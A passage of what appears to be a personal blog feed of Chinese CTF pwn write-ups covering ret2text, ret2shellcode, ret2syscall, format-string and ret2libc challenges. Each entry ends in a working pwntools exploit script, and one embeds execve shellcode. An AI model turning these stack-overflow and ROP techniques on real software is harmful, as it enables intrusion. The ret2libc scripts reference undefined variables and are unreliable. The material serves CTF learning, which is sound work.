<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file，checksec —— 32-bit，开启NX</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA一看没啥，点进vuln函数找到一个read函数<br><img data-src="https://pic1.zhimg.com/80/v2-3f3caf9f6fe1b9fe6e5088a2e1619e2c_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-3a54c2fc46d20dc1f7a6493a4fd40ba9_1440w.webp"><br>由图中我们可以看到，buf分配的空间为0x88,而read函数读取0x100，显然存在溢出<br>shift+f12找到有字符串&#x2F;bin&#x2F;sh，并且在vuln函数里有system函数，只不过参数是”ehco Input：”罢了<br>记下system函数的plt表地址0x08048320<br><img data-src="https://pic1.zhimg.com/80/v2-f2adaa287713c287b7d0b7070f687524_1440w.webp"></p>
<p>这样就只需要我们覆盖buf，将system函数地址写为返回地址，并将&#x2F;bin&#x2F;sh作为参数传递其地址即可</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27; 61.147.171.105 &#x27;</span>, <span class="number">60218</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(<span class="number">0x08048320</span>)+<span class="string">b&#x27;bbbb&#x27;</span> + p32(<span class="number">0x0804A024</span>)</span><br><span class="line"><span class="comment">#0x88为buf大小，+4是ebp大小，p32(0x08048320)是打包system地址，b&#x27;bbbb&#x27;是填充无效system返回地址， </span></span><br><span class="line"><span class="comment">#p32(0x0804A024)是/bin/sh地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>week3 T4</title>
    <url>/posts/8952815d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2shellcode-2-栈写入"><a href="#T4-ret2shellcode-2-栈写入" class="headerlink" title="T4 ret2shellcode 2 (栈写入)"></a>T4 ret2shellcode 2 (栈写入)</h2><blockquote>
<p>2023-01-15WP<br>sniperoj-pwn100-shellcode<br>考点：栈溢出 shellcode</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file ,checksec检查保护机制<br><img data-src="https://pic2.zhimg.com/80/v2-93af3c284b45a8b1bc9b8d234218d6b9_1440w.webp"><br>开启了PIE  地址变换</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA中看看源码<br><img data-src="https://pic1.zhimg.com/80/v2-1dda406b44f40e076971774458e5d654_1440w.webp"><br>发现已经有输出了buf的地址，因此随机化地址便可以进行绕过<br>继续分析发现read函数读入0x40字节，而buf分配的空间才0x10字节，存在栈溢出<br>打开string window，没有system和&#x2F;bin&#x2F;sh，应该是要写入shellcode了</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>先看看我们的空间能不能写下shellcode这里main函数里声明的buf只有0x10即16字节，属于局部变量，空间分配在栈上<br>gdb动态调试，（其实IDA能看出来，就是不确定对不对就是了）<br><img data-src="https://img-blog.csdnimg.cn/img_convert/3bcd85545cf60cac9b4aefb0eee24d1b.png"><br>我们计算buf的偏移量为rbp - rsp  &#x3D; 0x7fffde3d2820 - 0x7fffde3d2810 &#x3D; 10，再加上rbp 8字节为0x18即24字节</p>
<p>而我们用shellcraft生成的shellcode时44字节的，显然已经超过了<br>于是我们想找一个长度较小的shellcode来写入，但是由于某些我还没搞很懂的原因，我们必须要将把shellcode放在返回<br>地址的后面<br>那放在后面的话是不是44字节的shellcode就可以使用了呢？其实也不行，要注意到read函数是读取0x40字节的，这就使得读取的字符串长度有一定的限制。这0x40字节的数据，既要包括填充的垃圾数据，也要包括shellcode的返回地址和shellcode的内容，我们还得计算一下允许的shellcode的长度<br>0x40 - ( 0x10 + 8 ) - 8 &#x3D; 32<br>（0x10+8）为造成溢出填充的垃圾数据，后面8为是shellcode地址的长度，所以构建的shllcode必须在32以内<br>之前使用的shellcraft.sh()生成的shellcode有44字节，在这里只有32字节，因此并不适用</p>
<blockquote>
<p>shellcode&#x3D;”\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
</blockquote>
<p>一个找shellcode的网站</p>
<blockquote>
<p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a><br><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a> </p>
</blockquote>
<p>这个shellcode只有23个字节，短小精悍，适合放在栈中去执行</p>
<p>写exp (发现一个地方：就是正常python代码不能在开头留空格)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">addr = p.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Now give me your answer&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p64(<span class="built_in">int</span>(addr,<span class="number">16</span>)+<span class="number">32</span>) + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这里我们只知道一个确定的buf的addr，shellcode的地址要从buf的地址推出来，也就是int(addr,16)+32</p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>为什么不可以找一个长度小于24的shellcode直接写入buf中呢？而非要先填充buf再返回至写shellcode的地方呢？<br>在网上找到一个解释不知道对不对</p>
<blockquote>
<p>因为其本身是有push指令的，如果我们把shellcode放在返回地址的前面，在程序leave的时候会破坏shellcode，所以我们将其放在后面</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week4&amp;&amp;week5-T2</title>
    <url>/posts/b5711f0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-ret2syscall"><a href="#T2-ret2syscall" class="headerlink" title="T2 ret2syscall"></a>T2 ret2syscall</h2><blockquote>
<p>2023-01-22WP<br>ctf-wiki 基础rop<br>考点：ret2syscall</p>
</blockquote>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">题目链接</a></p>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 32-bit 开启NX保护，堆栈不可执行<br>而且注意这是statically linked（静态链接），不能通过泄露库函数地址获取system函数地址</p>
<p><img data-src="https://pic3.zhimg.com/80/v2-ce9f573c1ee908c7343b45691c74ce8e_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，发现没有system函数可用<br>有gets函数，应该是通过它实现栈溢出</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-5cc70f310e93e5c4fb3262ff9297fb44_1440w.webp"></p>
<p>由0x01可知我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。采取使用ret2syscall即控制程序执行系统调用，获取 shell。</p>
<p>也就是我们只需要把各个参数放在对应的寄存器中，执行int 0x80 就可实现对系统的调用</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>利用系统调用来获取shell</p>
<blockquote>
<p>execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)</p>
</blockquote>
<p>关于系统调用补充知识见0x05</p>
<p>构造的目标如下</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb</li>
<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<p>我们要找到系统调用相对于的寄存器的值<br>首先要让EAX &#x3D; 0xb，那么需要的指令是 pop eax  ；但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，所以pop之后还需要一个ret返回到控制程序执行流， pop eax ；ret</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-c204d633f5590e37cb76a002732c2e3c_1440w.webp"></p>
<p>选择这个地址：</p>
<blockquote>
<p>0x080bb196 : pop eax ; ret</p>
</blockquote>
<p>同理，查找控制其他三个寄存器的gadget</p>
<p><img data-src="https://pic4.zhimg.com/80/v2-1e5731dc562a330b4797360501705ecb_1440w.webp"></p>
<p>我们选择这个地址：</p>
<blockquote>
<p>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</p>
</blockquote>
<p>这个可以直接控制其它三个寄存器。</p>
<p>还要获取&#x2F;bin&#x2F;sh的地址0x80BE408</p>
<p><img data-src="https://pic4.zhimg.com/80/v2-6141708a6cddca7ad9fd374297af1fe3_1440w.webp"></p>
<p>还有int 0x80的地址  0x08049421 </p>
<p><img data-src="https://pic4.zhimg.com/80/v2-ff0f310e66188f0ab84f3f516e986ee7_1440w.webp"></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>可以写exp了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./rop&quot;)</span><br><span class="line">pop_eax_ret = 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line"></span><br><span class="line">payload = flat([b&#x27;A&#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</span><br><span class="line">#偏移量的计算方法和ret2text的相同</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>补充一些系统调用的相关知识</p>
<p>Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号（在 &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h 和 &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h 分别可以查看 64 位和 32 位的系统调用号。）来区分入口函数。</p>
<p>操作系统实现系统调用的基本过程是：</p>
<ol>
<li>应用程序调用库函数（API）；</li>
<li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
<li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
<li>中断处理函数返回到 API 中；</li>
<li>API 将 EAX 返回给应用程序</li>
</ol>
<p>应用程序调用系统调用的过程是：</p>
<ol>
<li>把系统调用的编号存入 EAX；</li>
<li>把函数参数存入其它通用寄存器；</li>
<li>触发 0x80 号中断（int 0x80）</li>
</ol>
<p>Linux在用int 0x80进行系统调用时，调用号存在于EAX，第一个参数存在于EBX，第二个参数存在于ECX，第三个参数存在于EDX</p>
<p>更多系统调用号可参考    参考文章</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_44864859/article/details/106213446">ret2syscall知识点及例题</a><br><a href="https://blog.csdn.net/qq_33769475/article/details/121953414#:~:text=%E6%AD%A4%E6%AC%A1%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E4%BB%AC%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%80%E6%AE%B5%E4%BB%A3%E7%A0%81%E6%88%96%E8%80%85%E8%87%AA%E5%B7%B1%E5%A1%AB%E5%86%99%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%8E%B7%E5%BE%97%20shell%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%20gadgets%20%E6%9D%A5%E8%8E%B7%E5%BE%97,shell%EF%BC%8C%E8%80%8C%E5%AF%B9%E5%BA%94%E7%9A%84%20shell%20%E8%8E%B7%E5%8F%96%E5%88%99%E6%98%AF%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E3%80%82%20%E9%87%87%E5%8F%96%E4%BD%BF%E7%94%A8ret2syscall%E5%8D%B3%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%8C%E8%8E%B7%E5%8F%96%20shell%E3%80%82">ret2syscall</a><br><a href="https://www.cnblogs.com/gsharpsh00ter/p/6402104.html">Linux系统调用号 - gsharpsh00ter - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week4&amp;&amp;week5-T3</title>
    <url>/posts/7c502166/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-第五空间2019-决赛-PWN5"><a href="#T3-第五空间2019-决赛-PWN5" class="headerlink" title="T3 [第五空间2019 决赛]PWN5"></a>T3 [第五空间2019 决赛]PWN5</h2><blockquote>
<p>2023-01-27WP<br>BUUCTF pwn第七题<br>考点：格式化字符串漏洞</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file &amp;&amp; checksec —— 32 bit , 开启NX，开启cannary</p>
<p><img data-src="https://pic3.zhimg.com/80/v2-9e3862844f2bd9655cfffdff011bd7da_1440w.webp"></p>
<p>这就没法栈溢出了<br>运行程序看看输出</p>
<p><img data-src="https://pic4.zhimg.com/80/v2-28662f39bf58b3e1ecc77bfbb48c1fab_1440w.webp"></p>
<p>0x02</p>
<p>IDA查看代码</p>
<p><img data-src="https://pic2.zhimg.com/80/v2-33b5a588a4426ffce92591baff62ae05_1440w.webp"></p>
<p>先找string window 发现&#x2F;bin&#x2F;sh，进一步查看发现程序就是先读取用户名，再读入密码，然后再将用户输入的密码和生成的一个随机密码比较，正确则执行system(&#x2F;bin&#x2F;sh)，错误则输出fail</p>
<p>观察发现printf(&amp;buf);存在格式化字符串漏洞</p>
<p>（关于格式化字符串漏洞的相关知识会另写一篇）</p>
<p>0x03</p>
<p>现在可以利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据就好了 </p>
<p>首先利用测试数据”AAAA %08x %08x %08x %08x %08x %08x %08x………… “来确定偏移量，</p>
<p><img data-src="https://pic4.zhimg.com/80/v2-13630a4e96f63372c3c048636423b0eb_1440w.webp"></p>
<p>发现输入的数据是栈的第十个</p>
<p>并且存放生成的随机密码的地址是从0x0804C044开始的，共四字节空间</p>
<p>所以我们可以用%10$,%11$,%12$,%13$去定位到这4个地址，再用%n修改这些地址里的内容 </p>
<p><img data-src="https://pic2.zhimg.com/80/v2-4c6e49700dcdd067c211a07e233208e9_1440w.webp"></p>
<p>可以构造payload了</p>
<p>0x04</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">    </span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28332)</span><br><span class="line">    </span><br><span class="line">addr = 0x804c044</span><br><span class="line">    </span><br><span class="line">payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)</span><br><span class="line">payload+=b&#x27;%10$n%11$n%12$n%13$n&#x27;</span><br><span class="line">    </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(str(0x10101010))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>因为总共输入了四个地址，共16位，所以%n所赋值的数是16，所以用户输入密码时发送的数据为0x10101010</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week4 T1</title>
    <url>/posts/64ef4d6b/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Week4-amp-amp-Week5-T1-jarvisoj-level0"><a href="#Week4-amp-amp-Week5-T1-jarvisoj-level0" class="headerlink" title="Week4&amp;&amp;Week5 T1  jarvisoj_level0"></a>Week4&amp;&amp;Week5 T1  jarvisoj_level0</h2><p>2023-01-20WP<br>BUUCTF pwn 第六题<br>考点： 简单栈溢出&#x2F;基本rop ret2text</p>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 64-bit，开NX</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看发现main函数里的vulnerable_function()函数里的read函数读取0x200ull，而buf空间只有0x80<br>又找到有system(“&#x2F;bin&#x2F;sh”)<br>返回其地址</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,29175)</span><br><span class="line">ret_arr = 0X40059A</span><br><span class="line">payload = b&#x27;a&#x27;*(0x80 + 0x8) + p64(ret_arr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week4&amp;&amp;week5-T4</title>
    <url>/posts/e234b4c5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2libc3"><a href="#T4-ret2libc3" class="headerlink" title="T4 ret2libc3"></a>T4 ret2libc3</h2><blockquote>
<p>2021-01-30WP<br>ctf-wiki ret2libc3<br>考点：栈溢出rop</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这个是真的难……  首先得透彻理解got和plt，其次还得对exp的写作要有一定的熟练度，而且还有各种各样古怪的写法…… 现在我还很多地方琢磨不清楚，只是依葫芦画瓢地复盘了一下，现在这篇题解只是写个大框架，具体细节后面慢慢补充了……</p>
<p>file checksec —— 32-bit 开NX</p>
<p><img data-src="https://pic2.zhimg.com/80/v2-39081f4041a6adc22d72564532642699_1440w.webp"></p>
<p>漏洞和内存分析和之前的系列题类似，不赘述了</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，既没有system也没有binsh </p>
<p><img data-src="https://img-blog.csdnimg.cn/fe4f5738bcd04e6fbe3cd80ed056f189.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知<br>不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）<br>而现在我们有一个puts函数，libc中也有system和binsh</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和&#x2F;bin&#x2F;sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可<br>我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -search的网站</a>查询，可得到puts函数system函数和binsh字符串对应的偏移地址</p>
<p><img data-src="https://img-blog.csdnimg.cn/66db2c69d62a4149868ab50a5c933698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>（这里直接盗图了……）</p>
<p>知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，&#x2F;bin&#x2F;sh字符串的偏移相加，就可以得到对应的真实地址<br>然后写完整的exp </p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和&#x2F;bin&#x2F;sh的地址，拿到shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#first exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;ret2libc3&#x27;)</span><br><span class="line">p=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line">print(&quot;puts addr = &quot;, hex(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#second exp</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(&quot;puts_addr = &quot;,hex(puts_addr))</span><br><span class="line">sys_offset = 0x03cd10</span><br><span class="line">puts_offset = 0x067360</span><br><span class="line">sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算</span><br><span class="line">libc_base_addr = puts_addr - puts_offset #计算出libc基地址</span><br><span class="line">sys_addr = libc_base_addr + sys_offset #计算出system的真实地址</span><br><span class="line">sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址</span><br><span class="line"></span><br><span class="line">print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))</span><br><span class="line">print(&quot;sys_addr = &quot;,hex(sys_addr))</span><br><span class="line">print(&quot;sh_addr = &quot;,hex(sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>还有其他几种方法目前没用搞懂<br>之后学会了（看懂了）再写过<br><strong>问</strong>：</p>
<blockquote>
<p>p.recv()[0:4]和p.recv(4）的区别？？<br>网上没搜到<br>要在本地打通是不是要对libc做什么操作呀</p>
</blockquote>
<p>参考资料：<br>  <a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc</a><br>  <a href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3</a><br>  <a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichen二进制安全</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week6-T1</title>
    <url>/posts/c63e16b3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Week-6-T1-bjdctf-2020-babystack"><a href="#Week-6-T1-bjdctf-2020-babystack" class="headerlink" title="Week 6 T1 bjdctf_2020_babystack"></a>Week 6 T1 bjdctf_2020_babystack</h2><blockquote>
<p>2023-02-05WP<br>BUUCTF pwn 第十一题<br>考点：ret2text</p>
</blockquote>
<span id="more"></span>

<p>省略第一步……只开了NX</p>
<blockquote>
<p>__isoc99_scanf(“%d”, &amp;nbytes)    让用户输入下次输入时接受的数据的长度</p>
</blockquote>
<blockquote>
<p>read(0, &amp;buf, (unsigned int)nbytes)   用户可以控制长度，实现栈溢出</p>
</blockquote>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>打开IDA</p>
<p><img data-src="https://img-blog.csdnimg.cn/20200802192521891.png"></p>
<p>找到有&#x2F;bin&#x2F;sh<br>找到后门函数</p>
<p><img data-src="https://img-blog.csdnimg.cn/20200802192937904.png"></p>
<p>buf占用的空间为0x10</p>
<p><img data-src="https://img-blog.csdnimg.cn/20200802192913332.png"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,29891)</span><br><span class="line"></span><br><span class="line">backdoor_addr = 0x4006e6</span><br><span class="line"></span><br><span class="line">payload =b &#x27;a&#x27; * (0x10+8) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;100&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>发现这样也不错，交给工具来找地址</p>
<p><img data-src="https://img-blog.csdnimg.cn/4d3c024d108c4bbd85c7ef85fd505712.png"></p>
<ul>
<li>变量(unsigned int)nbytes用户可控，且是个无符号函数</li>
<li><strong>可用-1进行绕过</strong>，这样用户可输入的数据长度就十分巨大了</li>
<li>接着调用backdoor()即可getshell</li>
</ul>
